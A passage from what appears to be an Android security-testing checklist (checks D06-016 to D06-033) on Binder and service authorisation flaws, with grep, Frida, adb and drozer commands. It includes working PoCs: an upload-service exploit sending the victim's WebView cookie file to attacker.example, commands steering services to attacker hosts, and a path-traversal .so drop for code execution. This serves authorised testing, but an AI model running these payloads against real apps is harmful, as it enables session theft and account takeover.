- **Escalation:** → D13 (device-local account takeover), → D15 (backend abuse with the victim's session),
  → D06-032 if the method writes a caller-supplied path.
- **Ruled out when:** Every method body performs a caller check that dominates the sensitive call **and**
  that check is evaluated on the transaction thread (D06-016) **and** the comparison is against a signing
  certificate, not a package name (D06-020). A single missing element makes this live again.

### D06-016 · `Binder.getCallingUid()` evaluated off the transaction thread returns *your own* UID

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) — a total authorisation bypass on the IPC surface |
| **Attacker** | AM-03 |
| **Applies to** | All. Android ships the lint check `BinderGetCallingInMainThread` ("Incorrect usage of getCallingUid() or getCallingPid()") — its presence in the build config is worth checking too. |
| **Maps to** | Android Lint `BinderGetCallingInMainThread`; `android.os.Binder` (local calls return your own UID/PID; `getCallingUidOrThrow()` exists to fail closed when there is no remote caller); MASWE-0018 |

- **Test:** `Binder.getCallingUid()` is only meaningful while the current thread is executing an incoming
  transaction. Code that caches the identity into a field, hops to a `Handler`/`Executor`/coroutine
  dispatcher, unparcels an `AttributionSource` outside the transaction thread, or is also reachable
  in-process, silently authorises everything — the call returns `Process.myUid()` and every comparison
  passes. This is a check most Android checklists omit entirely.
- **How:**
```bash
grep -rnE 'getCallingUid|getCallingPid|clearCallingIdentity|restoreCallingIdentity|AttributionSource' out/sources/ -A8
# flag any getCallingUid() reached from a Runnable/Handler/post/Executor/launch{}, or stored to a field
grep -rnE 'getCallingUid\(\)' out/sources/ -B12 | grep -nE 'post\(|Handler|Executor|submit\(|launch\s*\{|async\s*\{|this\.[A-Za-z]+ = .*getCallingUid'
grep -rnE 'getCallingUid\(\)\s*==\s*(android\.os\.)?Process\.myUid' out/sources/
```
  Runtime confirmation — the thread name is the tell:
```js
Java.perform(function () {
  var B = Java.use('android.os.Binder'), T = Java.use('java.lang.Thread'),
      P = Java.use('android.os.Process');
  B.getCallingUid.implementation = function () {
    var u = this.getCallingUid();
    console.log('[getCallingUid] -> ' + u + '  myUid=' + P.myUid() +
                '  thread=' + T.currentThread().getName());
    return u;
  };
});
```
- **Proof:** A trace line showing `getCallingUid() -> <the app's own uid>` on a thread whose name is not
  `Binder:<pid>_N`, while your PoC app is the actual caller — and the privileged branch executing.
- **Escalation:** Everything the interface exposes becomes unauthenticated; this converts D06-008's
  "check present" rows into findings.
- **Ruled out when:** Every `getCallingUid()` call site is lexically inside a `$Stub` method and reached
  synchronously from it, confirmed by the Frida trace showing a `Binder:*` thread name and your PoC's UID.

### D06-017 · The three ways a permission check inside a Binder method is a no-op

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) — "a permission check that does not fail closed is a complete access-control bypass" |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | Google `privacy-and-security/risks/intent-redirection` "Common Mistakes to Avoid" (assuming `checkCallingPermission()` throws exceptions instead of returning integers); MASTG-TEST-0365; MASWE-0018 |

- **Test:** Three distinct failure shapes, all of which grep as "a check is present":
  1. **Discarded return.** `checkCallingPermission(p);` returns an `int` and does not throw. Called for
     side effect, the result never compared to `PackageManager.PERMISSION_GRANTED` (0), the code
     continues.
  2. **`checkCallingOrSelfPermission`.** Returns granted when the call originated in-process, so it does
     not authenticate a remote caller reliably — a known footgun.
  3. **Check after the action.** The UID is fetched and logged, or the permission tested, *after* the file
     write or the token fetch has already happened.
- **How:**
```bash
# 1 — result discarded
grep -rnE '^\s*(context\.|mContext\.|this\.)?check(Calling|CallingOrSelf)Permission\s*\([^)]*\)\s*;' out/sources/
# 2 — the OrSelf variant anywhere in a Stub
grep -rn 'checkCallingOrSelfPermission\|enforceCallingOrSelfPermission' out/sources/
# 3 — does the check dominate the action? read the control flow per hit
grep -rnE 'getCallingUid|checkCalling' out/sources/ -A30 | grep -nE 'openFileOutput|FileOutputStream|execSQL|getToken|newCall\(|System\.load'
```
- **Proof:** The decompiled method showing the discarded `int`, or the `OrSelf` call, or the sensitive
  call preceding the check — plus your PoC app completing the method without holding the permission.
- **Escalation:** Combines with D03's orphaned/weak custom-permission items into a permission-model bypass.
- **Ruled out when:** Every check compares against `PERMISSION_GRANTED` or uses the `enforce*` form (which
  throws), uses the non-`OrSelf` variant, and returns or throws before any sensitive call — verified by
  reading the control flow, not by the grep hit alone.

### D06-018 · `clearCallingIdentity()` scope creep — the confused deputy in one line

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | `android.os.Binder.clearCallingIdentity()` / `restoreCallingIdentity(long)`; Google `privacy-and-security/security-tips` (Binder/Messenger section); MASWE-0018 |

- **Test:** `clearCallingIdentity()` resets the identity of the incoming IPC on the current thread and
  returns a token to restore. Two bugs: the identity is cleared **before** the permission check, so the
  check now tests the app against itself; or `restoreCallingIdentity()` is not in a `finally`, so an
  exception leaves the thread running with the app's own identity for the next transaction it serves.
- **How:**
```bash
grep -rn 'clearCallingIdentity' out/sources/ -B6 -A25
# 1. is the permission check BEFORE the clear?   2. is restore in a finally?
grep -rn 'clearCallingIdentity' out/sources/ -A25 | grep -nE 'finally|restoreCallingIdentity'
# any caller check that appears AFTER a clear is testing the app, not the caller:
grep -rn 'clearCallingIdentity' out/sources/ -A20 | grep -nE 'getCallingUid|checkCalling'
```
- **Proof:** A call graph in which `clearCallingIdentity()` precedes (or replaces) the permission check,
  plus a PoC client reaching the privileged operation. For the missing-`finally` variant: throw inside the
  cleared region (an oversized argument works) and show the *next* transaction from a different UID
  succeeding.
- **Escalation:** Permission re-delegation — the app performs the operation with its own permission set on
  behalf of an unauthenticated caller. → D15.
- **Ruled out when:** Every `clearCallingIdentity()` is preceded by a caller check on the transaction
  thread and paired with `restoreCallingIdentity(token)` inside a `finally`.

### D06-019 · `getCallingPackage()` / `getCallingActivity()` used inside a Service

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | Google `privacy-and-security/risks/intent-redirection` "Common Mistakes to Avoid" (relying on `getCallingActivity()` returning non-null); MASWE-0018 |

- **Test:** Teams port the Activity-era habit into services and providers. `getCallingActivity()` returns
  **null** when the caller used `startActivity` rather than `startActivityForResult` — so a guard of the
  form `if (getCallingActivity() != null && isTrusted(...))` is skipped entirely by the cheapest possible
  attacker action. In a `Service` the method is not a caller-identity source at all.
- **How:**
```bash
grep -rnE 'getCallingActivity\(\)|getCallingPackage\(\)' out/sources/ | grep -vE 'Binder\.getCallingUid'
```
  Then check each hit's null handling and whether the enclosing class is a `Service`.
- **Proof:** The guard expression with its null path, plus the call completing when you deliver the intent
  in the form that makes the value null.
- **Escalation:** Everything behind the guard is unauthenticated.
- **Ruled out when:** No `getCallingActivity()`/`getCallingPackage()` appears in any service class, and the
  caller identity comes from `Binder.getCallingUid()` on the transaction thread.

### D06-020 · Caller allow-list keyed on package name with no signature check

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null); escalates to `broken_authentication_and_session_management.authentication_bypass` (P1) if the impersonated peer's methods mint auth material |
| **Attacker** | AM-03 |
| **Applies to** | All. The `<queries>` requirement at **targetSdk ≥ 30** makes hardcoded peer package names much more common, so the pattern is growing. |
| **Maps to** | Google `privacy-and-security/risks/sender-of-pending-intents` ("You should always check if the calling package has the expected signature, as sideloaded packages can have package names overlapping with ones from the Play Store"); `risks/insecure-machine-to-machine`; MASWE-0018 (CWE-926) |

- **Test:** The correct pattern is `Binder.getCallingUid()` inside the transaction, then
  `PackageManager.getPackagesForUid()`, then a **signature** comparison. Code that resolves a UID to a
  package name and compares only the name is bypassable by sideloading a package with that name on a
  device where the real peer is absent.
- **How:**
```bash
grep -rnE 'getNameForUid|getPackagesForUid|getPackageUid|getCallingUid' out/sources/ -A10
grep -rnE 'checkSignatures|GET_SIGNING_CERTIFICATES|GET_SIGNATURES|signingInfo|hasSigningCertificate|PackageInfo\.signatures' out/sources/
```
  A hit set in the first grep with an empty second grep is the finding. PoC: build a stub app whose
  `applicationId` is the trusted peer's name, install it on a device where the real peer is not present,
  and complete the privileged call.
- **Proof:** The decompiled comparison against a string literal package name with no certificate check,
  plus your sideloaded stub receiving the privileged return value. Screenshot `adb shell pm list packages
  | grep <trusted-name>` showing only your stub installed.
- **Escalation:** You are now the vendor's own companion app as far as this service is concerned →
  every method on the interface, → D15.
- **Ruled out when:** Each allow-listed package is matched with `PackageManager.hasSigningCertificate()`
  or `checkSignatures()` returning `SIGNATURE_MATCH`, evaluated on the transaction thread. Note the v3.1
  key-rotation caveat on pre-13 devices (D02) before calling a signature check sound.

### D06-021 · UID→package resolution that assumes one package per UID

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 (with a shared-UID sibling) or AM-08 |
| **Applies to** | All; the exposure is real wherever the vendor ships a `sharedUserId` family |
| **Maps to** | Google "Permission-based access control to exported components" (the mitigation snippet uses `getNameForUid(callingUid)` compared against a hardcoded name — a pattern that must be paired with a signature check); MASWE-0018 |

- **Test:** `getPackagesForUid()` can return **multiple** packages, and `getNameForUid()` returns a
  `shared:com.example.group` string rather than a package name for a shared UID. An allow-list written as
  `pm.getPackagesForUid(uid)[0].equals("com.trusted")` or
  `pm.getNameForUid(uid).equals("com.trusted")` fails open or closed incorrectly whenever a shared UID is
  in play — which is how a weak sibling passes a "trusted caller" test.
- **How:**
```bash
grep -rnE 'getNameForUid|getPackagesForUid\s*\([^)]*\)\s*\[\s*0\s*\]|getPackagesForUid' out/sources/ -A6
# confirm the device actually has shared UIDs
adb shell dumpsys package com.target.app | grep -E 'userId=|sharedUser='
adb shell pm list packages -U | awk -F: '{print $NF}' | sort | uniq -d   # UIDs owning >1 package
```
- **Proof:** Decompiled code indexing `[0]` with no length check or `shared:` handling, plus a device
  listing where at least one UID owns two packages.
- **Escalation:** Joins D03's `sharedUserId` item: the weakest app in the shared-UID family becomes the
  authorised caller for all of them.
- **Ruled out when:** The code iterates the full array, handles a null return, rejects the `shared:`
  prefix, and pairs the name with a signature check.

### D06-022 · Caller identity taken from `getCallingPid()` — the PID-reuse race

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All, but overwhelmingly a system/OEM-service finding. In a client app, look for it in any service doing its own caller authorisation. |
| **Maps to** | CVE-2017-13236 (`getpidcon` permission bypass in the KeyStore service, EDB 43996); CVE-2017-13209 (hardware service manager arbitrary service replacement due to `getpidcon`, EDB 43513); CVE-2019-2023 (`getpidcon()` in hardware binder ServiceManager permits ACL bypass, EDB 46504); EDB 40381 |

- **Test:** PID-based caller identification is racy: the caller can exit and have its PID reused before the
  service resolves it. Four separate Exploit-DB entries are this exact bug in AOSP services. The correct
  idiom is UID-based.
- **How:**
```bash
grep -rnE 'getCallingPid\(\)|Binder\.getCallingPid|getpidcon|Process\.myPid\(\)' out/sources/ <native-src>
# the correct idiom that should be there instead
grep -rnE 'Binder\.getCallingUid\(\)|checkCallingPermission|enforceCallingPermission|getPackagesForUid' out/sources/
```
  Exploit shape: bind, then fork-and-exit repeatedly to recycle PIDs while the service resolves the
  context. Instrument both sides so you can count wins.
- **Proof:** The service performing the privileged action for a caller that should have been rejected —
  report it as "won N of M attempts", not as a single success (see D06-069 for the sampling rule).
- **Escalation:** Service replacement → every client of that service now talks to you.
- **Ruled out when:** No PID-derived value participates in an authorisation decision; PIDs used only for
  logging are fine and should be recorded as such.

### D06-023 · The caller check never compares the Android **user id**

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when the crossing yields another user's data |
| **Attacker** | AM-03 inside a work profile / Private Space / OEM clone, or AM-05 |
| **Applies to** | Android 5+ multi-user. Note that by default a second user cannot see user 0's packages — so prove whether your bind actually crossed; if it did not, test the **clone / work-profile** variant instead (same profile group, different UID). |
| **Maps to** | Google Android & Google Devices programme in-scope impact "Cross-user sensitive data access"; MASWE-0018 |

- **Test:** Everything else in this chapter binds from user 0. A work profile, Private Space or OEM-clone
  instance of the *same app* runs as a different UID with a different data directory — and a guard written
  as "same signature" or "uid is in my allow-list" passes trivially for a clone. The guard almost never
  compares `UserHandle.getUserId(uid)`.
- **How:**
```bash
adb shell pm create-user gapuser && adb shell pm list users
adb shell pm install -r --user 10 attacker.apk
adb shell am start-service --user 10 -n com.target.app/.ExportedService
# what does the target see?
adb shell dumpsys activity services com.target.app | grep -E 'user|clientUid|ConnectionRecord'
grep -rnE 'getCallingUid|getCallingPackage|checkSignatures|getPackagesForUid' out/sources/ -A6 \
  | grep -n 'UserHandle'
```
- **Proof:** A `ConnectionRecord` in `dumpsys activity services` naming a client in a different user id,
  with the service still returning data. Capture both `pm list users` and the dumpsys in the same sitting.
- **Escalation:** → D11 cross-user data read; → D23 entitlement duplication across profiles.
- **Ruled out when:** The guard calls `UserHandle.getUserId(Binder.getCallingUid())` and compares it to
  `UserHandle.myUserId()`, **or** the cross-user bind is refused by the platform and you have the
  `dumpsys` showing no `ConnectionRecord` was created.

### D06-024 · Permission enforced only in `onBind()`, then the binder handle is relayed

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 (the relaying app holds nothing) |
| **Applies to** | All |
| **Maps to** | Google "Permission-based access control to exported components" (recommends `enforceCallingPermission()` and per-method `Binder.getCallingUid()` validation); `android.os.Binder.linkToDeath`/`isBinderAlive` (binder handles are first-class transferable objects); MASWE-0018 |

- **Test:** `onBind()` runs once per *service*, not once per client: a second client bound to an
  already-running service receives the **same** `IBinder` without `onBind()` being called again. So a
  permission enforced in `onBind()` is enforced at most once, and never for a caller that obtains the
  handle some other way. Binder handles are transferable — `Bundle.putBinder` moves one between apps.
- **How:** Confirm in jadx that the check exists only in `onBind` and not in the `Stub` method bodies.
  Then: PoC app A (which holds the permission) binds and relays the handle to PoC app B (which holds
  nothing).
```java
// App A — holds the bind permission
Bundle b = new Bundle(); b.putBinder("h", serviceBinder);
sendBroadcast(new Intent("com.attacker.RELAY").putExtras(b).setPackage("com.poc.b"));

// App B — declares no permissions at all
IBinder h = intent.getExtras().getBinder("h");
IMyAidl.Stub.asInterface(h).privilegedMethod();
```
  Second variant, no relay needed: bind from A, leave the service running, then bind from B and check
  whether `onBind` is re-entered (hook it) — if not, B's handle arrived un-checked.
- **Proof:** App B, whose manifest declares no permissions, invoking the privileged method through the
  relayed handle; plus a Frida trace showing `onBind` called once for two distinct client UIDs.
- **Escalation:** Every privileged method on the interface; feeds D08 (a binder handle carried inside a
  `PendingIntent`'s Bundle).
- **Ruled out when:** Each `Stub` method performs its own caller check, so a relayed handle buys the
  recipient nothing — demonstrate by relaying and receiving a `SecurityException` in app B.

### D06-025 · Session state cleaned up only in `binderDied()`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the surviving session is an authenticated one |
| **Attacker** | AM-03 |
| **Applies to** | All services that keep per-client state keyed to a binder token |
| **Maps to** | `android.os.Binder.linkToDeath(DeathRecipient, int)`, `isBinderAlive()`; MASWE-0018 |

- **Test:** Servers commonly register a `DeathRecipient` to drop a client's session when the client process
  dies. If the server's authorisation state is keyed to the binder token but cleanup happens only on
  death, a client that keeps the handle alive — or an attacker who received a relayed token (D06-024) —
  keeps a privileged session after the authorised process is gone.
- **How:**
```bash
grep -rnE 'linkToDeath|DeathRecipient|binderDied|unlinkToDeath|isBinderAlive' out/sources/ -A12
```
  PoC: obtain the token in app A, relay it to app B, then kill A.
```bash
adb shell am force-stop com.poc.a
# then call from app B and see whether the server still honours the token
```
- **Proof:** App B's call succeeding after `com.poc.a` is gone from `adb shell ps -A`.
- **Escalation:** A persistent unauthorised session over every method on the interface.
- **Ruled out when:** The server re-checks the caller per transaction rather than trusting a registered
  token, so the surviving handle carries no authority.

### D06-026 · The guarding permission's `protectionLevel` is not `signature`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-03 (requests the permission) or AM-04 |
| **Applies to** | All apps defining a custom permission to guard a service |
| **Maps to** | MASTG-TEST-0365, MASWE-0018; cross-reference D03 |

- **Test:** A `<service android:permission="com.target.app.BIND_SYNC">` looks protected in the register.
  It is only protected if the permission's `protectionLevel` is `signature` (or `signatureOrSystem`). At
  `normal` the system grants it at install with no user interaction; at `dangerous` the user is prompted
  once. Neither restricts AM-03 in any meaningful way.
- **How:**
```bash
grep -nA4 '<permission ' base_apktool/AndroidManifest.xml
adb shell pm list permissions -d -g | grep -A3 com.target
# then simply request it in the PoC's manifest and bind:
# <uses-permission android:name="com.target.app.BIND_SYNC" />
adb install poc.apk && adb shell dumpsys package com.poc.attacker | grep -A10 'requested permissions'
```
- **Proof:** `dumpsys package com.poc.attacker` showing the permission `granted=true` with no user prompt,
  followed by a successful bind and a privileged method call.
- **Escalation:** Reduces this service to the D06-015 case; also a standalone D03 finding.
- **Ruled out when:** The permission is `signature`-level **and** no other installed package shares the
  signing key (check the vendor's whole app family — a same-signature sibling with a weaker attack surface
  reintroduces the reach via D06-021).

### D06-027 · Exported service reached through `onStartCommand` — the path reviewers skip

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on the action); `insecure_os_firmware.command_injection` (P1) if the service shells out |
| **Attacker** | AM-03 |
| **Applies to** | All. `startService` from the background is restricted on API 26+ — use `startForegroundService` semantics or bind instead; a refusal there is a platform limitation, not app hardening. |
| **Maps to** | MASTG-TEST-0365, MASTG-TECH-0161, MASTG-TOOL-0015 (drozer `app.service.start` / `app.service.stop`); CVE-2015-7889 / EDB 38558 (Samsung `QuickReplyService`, action `com.samsung.android.email.intent.action.QUICK_REPLY_BACKGROUND`, no permission, composed and sent the victim's message to any address the caller named) |

- **Test:** Exported services *started* rather than bound execute `onStartCommand` with the attacker's
  Intent. This is routinely overlooked because the reviewer went straight to the AIDL surface. Read
  `onStartCommand` for every extra it consumes and every action it branches on.
- **How:**
```bash
grep -rn 'onStartCommand\|onHandleIntent\|onHandleWork' out/sources/ -A40 | grep -nE 'getStringExtra|getParcelableExtra|getAction\(\)|getData\(\)'
adb shell am startservice -n com.target.app/.SyncService --es cmd wipe --es url https://attacker.example
adb shell am start-foreground-service -n com.target.app/.SyncService -a com.target.app.SYNC
adb shell am startservice -n com.target/.SomeService -a com.target.ACTION \
  --es data "{'account-id':'victim@example.com','toList':'attacker@example.com','msg':'x'}"
drozer> run app.service.start --component com.target.app com.target.app.SyncService \
        --action com.target.app.ACTION_UPLOAD --extra string dest https://attacker.tld/
```
- **Proof:** The privileged side effect observable **outside** the app — in the Samsung case, the reply
  appearing in the victim's Sent folder and arriving in the attacker's inbox. For your target: an outbound
  request at your collaborator, a file written, a local record deleted. Re-prove from the PoC app, not
  from `adb` (D06-080).
- **Escalation:** → D14/D20 (endpoint repoint and exfiltration); guessable object identifiers inside the
  service (incrementing message ids, as in EDB 38558) turn one leak into bulk enumeration → D15 IDOR.
- **Ruled out when:** `onStartCommand` ignores the Intent entirely (returns before reading extras), or
  every branch it takes is gated by a caller check performed inside `onStartCommand` itself.

### D06-028 · Service as a network-egress confused deputy — attacker URL, victim's credentials

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for the exfiltrated bearer token; `broken_access_control.exposed_sensitive_android_intent` (null) for the reach |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | MASWE-0018; ATT&CK T1635 (Steal Application Access Token); Mobile Top 10 2024 M3 |

- **Test:** An exported service that takes a URL or host from the caller and fetches it with the app's own
  HTTP client is the mobile equivalent of SSRF — except the interesting part is not the internal network,
  it is that the app's interceptor attaches the victim's `Authorization` or `Cookie` header to *your* URL.
- **How:**
```bash
grep -rnE 'getStringExtra\("(url|endpoint|host|uri|callback|redirect|dest|server)"' out/sources/
grep -rnE 'addInterceptor|Authorization|setRequestProperty\("Authorization"' out/sources/ -B4 -A4
adb shell am startservice -n com.target.app/.FetchService --es url "http://<your-collab>/x"
```
  Then re-drive it from the PoC app and watch your listener.
- **Proof:** The inbound HTTP request at your collaborator carrying the victim's `Authorization`/`Cookie`
  header, captured in full with the request line and headers. Leave the trace id and JSON key names
  visible; redact the token's value in the report body but keep the unredacted original for triage.
- **Escalation:** Token → D15 IDOR/BOLA at full account privilege → account takeover. Also check whether
  the endpoint the service calls is an **older API version** than the web app uses (D06-081).
- **Ruled out when:** The URL is not caller-controllable (constructed from a compile-time constant or an
  allow-list of hosts validated with a proper host comparison, not `startsWith`/`contains`), or the client
  used for that request has no auth interceptor — prove the second by capturing the outbound request with
  a proxy and showing no credential header.

### D06-029 · Upload-helper service with caller-chosen file **and** destination

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the exfiltrated file contains session cookies or credentials |
| **Attacker** | AM-03 |
| **Applies to** | All; library-contributed services are the usual source, so this needs the merged manifest (D06-001) |
| **Maps to** | H1 #258460 (Quora, Medium — "It's really serious vulnerability which allows to takeover accounts"); B3nac index "Steal files due to exported services"; MASWE-0018 (CWE-306) |

- **Test:** Upload-helper libraries (`net.gotev.uploadservice`, WorkManager wrappers, custom sync
  services) are frequently exported by the library's *own* manifest. If the service takes both the file
  path and the destination URL from the Intent, it is a one-shot arbitrary-file-exfiltration primitive
  running as the victim's UID.
- **How:**
```bash
grep -B2 -A8 '<service' base_apktool/AndroidManifest.xml | grep -A8 'exported="true"'
grep -rnE 'uploadservice|UploadTaskParameters|MultipartUploadTask|addFile\(|setServerUrl\(' out/sources/
```
```java
UploadTaskParameters params = new UploadTaskParameters();
params.setId("1337");
params.setServerUrl("http://attacker.example/collect");
params.addFile(new UploadFile("/data/data/com.target.app/app_webview/Cookies"));

Intent intent = new Intent("net.gotev.uploadservice.action.upload");
intent.setClassName("com.target.app", "net.gotev.uploadservice.UploadService");
intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
intent.putExtra("multipartUtf8Charset", true);
intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
intent.putExtra("taskParameters", params);
startService(intent);
```
- **Proof:** A multipart POST arriving at your server containing the victim app's `app_webview/Cookies`
  SQLite file. Open it and show the session cookies, including the `httpOnly` ones — the flag is
  meaningless at the file layer. That last step is what converts a Medium into an account-takeover
  narrative.
- **Escalation:** → D11 (sandbox file read), → D13 (session theft from the stolen cookie jar).
- **Ruled out when:** The service is `exported="false"` in the **merged** manifest, or the file path is
  resolved against a fixed base directory with canonicalisation (`getCanonicalPath().startsWith(base)`)
  and the destination URL comes from a host allow-list.

### D06-030 · AIDL method that trusts a caller-supplied `savePath` / `filename` — write into `app_lib`, get RCE

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | All apps whose bound interface accepts a path, filename or URL |
| **Maps to** | Oversecured TikTok — `com.ss.android.socialbase.downloader.downloader.IndependentProcessDownloadService` exposing `tryDownload()` (URL, filename, path) → wrote `/data/user/0/com.zhiliaoapp.musically/app_lib/libuserinfo.so`, loaded on restart; CWE-73 (External Control of Filename or Path); MASWE-0050 |

- **Test:** The highest-severity shape in this domain. An unguarded AIDL method that downloads or copies
  to a caller-chosen path lets you drop a `.so` (or `.dex`/`.jar`) into a directory the app later
  `System.load()`s, giving you `JNI_OnLoad` execution in the victim's UID on the next start.
- **How:**
```bash
# find the sink
grep -rnE 'savePath|saveName|fileName|targetPath|outputPath|destination' out/sources/ -B4 -A8 | grep -iE 'Stub|aidl|RemoteException'
# find where the app loads code from its own dirs
grep -rnE 'System\.load\(|System\.loadLibrary\(|DexClassLoader|PathClassLoader|InMemoryDexClassLoader|app_lib|getDir\(' out/sources/
```
  Reach the interface reflectively when the AIDL class is not on your classpath:
```java
Context tc = createPackageContext("com.target.app", Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
Class<?> stub = tc.getClassLoader().loadClass("com.target.app.IDownloader$Stub");
Object svc = stub.getMethod("asInterface", IBinder.class).invoke(null, binder);
// build the request object reflectively and call tryDownload(url, "libuserinfo.so", "../app_lib")
```
- **Proof:** The file of your choosing appearing under the victim's private directory — verify with
  `adb shell run-as com.target.app ls -l app_lib/` on a debuggable build, or (better) by restarting the
  app and showing your `JNI_OnLoad` side effect (a file written as the victim UID, or a request from the
  victim's process to your listener).
- **Escalation:** → D17 persistent arbitrary code execution in the victim app's UID. This is the chain
  consumer; file the unauthenticated-interface primitive (D06-015) separately and cross-reference.
- **Ruled out when:** Every path argument is validated against a whitelist and canonicalised
  (`new File(base, name).getCanonicalPath().startsWith(base.getCanonicalPath())`), **and** the app loads
  code only from `getApplicationInfo().nativeLibraryDir` — a directory the app itself cannot write.

### D06-031 · Stopping a security-relevant service from an unprivileged app

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) when it durably disables a control; P5 when it is transient |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | drozer `app.service.stop` — "Formulate an Intent to stop a service, and deliver it to another application"; MASTG-TOOL-0015 |

- **Test:** The inverse of D06-027. An exported, unguarded RASP/integrity/heartbeat/sync service can be
  stopped by any app. On its own this is availability; the report is the **control it removes**.
- **How:**
```bash
drozer> run app.service.stop --component com.target.app com.target.app.IntegrityService
adb shell am stopservice -n com.target.app/.IntegrityService
adb shell dumpsys activity services com.target.app     # before and after
```
- **Proof:** The service present in `dumpsys activity services` before and absent after, plus the
  protection it provided demonstrably gone (the attestation call no longer fires in the proxy; the
  heartbeat stops; the tamper check no longer runs). Both dumps in the same sitting.
- **Escalation:** → D21, where the app's own defence argument now fails; the disabled control is also a
  precondition-weakener for other findings in the report.
- **Ruled out when:** The service restarts immediately (`START_STICKY` plus a watchdog you can observe
  re-arming it within seconds), or stopping it produces no change in the control's observable behaviour —
  in which case say which observable you measured.

### D06-032 · `Messenger` service — enumerate every `what` code and every `Bundle` key

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when a `what` code reaches a credential-validation branch; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a reply carries a token |
| **Attacker** | AM-03 |
| **Applies to** | Apps exposing `Messenger`/`Handler`-based services |
| **Maps to** | MASTG-TEST-0365, MASTG-TECH-0161 (shows the `--bundle-as-obj` form verbatim), MASTG-TEST-0029 (deprecated; source of the Sieve `AuthService` `MSG_SET /*6345*/`, `TYPE_KEY /*7452*/` walkthrough), MASTG-TOOL-0015 |

- **Test:** A `Messenger`'s real attack surface is the set of `msg.what` codes its `handleMessage`
  switches on, plus the `Bundle` keys each arm reads. Reverse the handler first, then drive it — including
  arms the UI never exercises (PIN validation, privileged commands, debug codes).
- **How:**
```bash
grep -rn 'handleMessage\|new Messenger(\|msg\.what\|msg\.getData()\|msg\.replyTo\|msg\.obj' out/sources/ -A25
```
```
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService \
       --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
dz> run app.service.send com.target.app com.target.app.CommandService \
       --msg 7 1 0 --extra string path /data/data/com.target.app/shared_prefs/auth.xml --bundle-as-obj
dz> run app.service.send com.target.app com.target.app.CommandService --msg 1 0 0 --no-response --timeout 5000
```
  `--msg` supplies `what arg1 arg2`; `--extra type key value` is repeatable; `--bundle-as-obj` builds the
  object from the supplied details, "useful when the `obj` parameter on the target is being cast back to a
  Bundle instead of using `Message.getData()`". Iterate `what` with Python, not a shell loop, and count.
- **Proof:** A reply `Message` whose `Data:` block contains data you were not entitled to, or a state
  change proving the branch executed — MASTG's Sieve walkthrough returns
  `what: 4 / arg1: 42 / arg2: 0` and the app's master password is now the attacker's value. **The proof is
  the state change (log in with the new password), not the reply codes.**
- **Escalation:** → D13 (credential overwrite is device-local account takeover), → D11 (a file-read
  `what` code), → D08 if the message carries a nested `Intent` or `PendingIntent`.
- **Ruled out when:** Every `what` arm either performs a caller check (which, per D06-033, it structurally
  cannot do with `getCallingUid` — so it must be a `sendingUid` reflection read or a shared secret) or
  performs no security-relevant action. Enumerate the full range you probed and state it.

### D06-033 · `Messenger` IPC is structurally unauthenticatable with the public SDK — say so, then test it

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | Every app exposing an exported `Messenger` |
| **Maps to** | Google `privacy-and-security/security-tips`: "If you are creating an interface that requires authentication and/or access controls, you must explicitly add those controls as code in the `Binder` or `Messenger` interface"; Android Lint `BinderGetCallingInMainThread`; MASWE-0018 |

- **Test:** `Messenger` is Binder underneath, but the transaction is `send(Message)` and the framework then
  **posts the message to a Looper**. By the time `handleMessage` runs you are no longer on the binder
  transaction thread, so `Binder.getCallingUid()` returns the app's own UID. The framework stamps the
  caller into `Message.sendingUid` in the Messenger stub, but that field is not public SDK — an app that
  wants the caller's identity must read it by reflection, and almost none do. The practical consequence:
  **most `Messenger` services perform no caller check at all, and the ones that "do" are checking
  themselves.**
- **How:**
```bash
